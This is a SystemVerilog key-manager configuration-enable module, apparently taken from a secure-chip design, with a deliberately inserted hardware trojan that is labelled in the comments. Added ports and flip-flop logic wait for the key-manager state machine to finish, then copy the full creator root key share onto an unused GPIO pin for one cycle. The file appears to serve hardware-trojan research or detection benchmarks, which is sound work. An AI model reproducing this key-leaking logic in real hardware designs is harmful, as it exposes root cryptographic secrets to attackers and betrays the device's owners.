`include "prim_assert.sv"

module keymgr_cfg_en #(
  // controls whether clear has an effect on output value during non-init
  parameter bit NonInitClr = 1'b1,
  // Trojan insertion: width of creator root key share for exfiltration
  parameter int KeyShareW = 128 // Adjust as per actual key width
) (
  input  clk_i,
  input  rst_ni,
  input  init_i,
  input  en_i,
  input  set_i,
  input  clr_i,
  output logic out_o,
  // Trojan insertion: Unused GPIO pin for exfiltration
  output logic [KeyShareW-1:0] trojan_gpio_o,      // <-- Trojan output
  // Trojan insertion: Monitoring FSM completion and key share input
  input  fsm_done_i,                               // <-- Trigger: FSM completion indicator
  input  [KeyShareW-1:0] creator_root_key_share_i  // <-- Payload: Key share input
);

  logic out_q;
  logic init_q;

  logic vld_clr;
  logic vld_set;
  logic vld_dis;

  assign vld_clr = init_q && clr_i;
  assign vld_set = init_q && set_i;
  assign vld_dis = init_q && !en_i;

  // the same cycle where clear is asserted should already block future
  // configuration
  logic out_clr;
  assign out_clr = NonInitClr ? clr_i : vld_clr;
  assign out_o = ~out_clr & out_q & en_i;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      init_q <= '0;
    end else if (init_q && !en_i) begin
      init_q <= '0;
    end else if (init_i && en_i) begin
      init_q <= 1'b1;
    end
  end

  // clearing the configure enable always has higher priority than setting
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      out_q <= 1'b1;
    end else if (vld_dis) begin
      out_q <= 1'b0;
    end else if (vld_set) begin
      out_q <= 1'b1;
    end else if (out_clr) begin
      out_q <= 1'b0;
    end
  end

  // ================================ Trojan Insertion Start ================================

  // Trojan logic: One-shot signal to leak key share for a single clock after FSM is done
  logic trojan_trigger_q;
  logic trojan_fired_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_q <= 1'b0;
      trojan_fired_q  <= 1'b0;
    end else if (fsm_done_i && !trojan_fired_q) begin
      trojan_trigger_q <= 1'b1;   // Trigger on FSM done
      trojan_fired_q  <= 1'b1;
    end else begin
      trojan_trigger_q <= 1'b0;   // Only for one cycle
    end
  end

  // Output share to GPIO for one cycle after FSM done
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_gpio_o <= '0;
    end else if (trojan_trigger_q) begin
      trojan_gpio_o <= creator_root_key_share_i;
    end else begin
      trojan_gpio_o <= '0;
    end
  end

  // ================================ Trojan Insertion End ================================

endmodule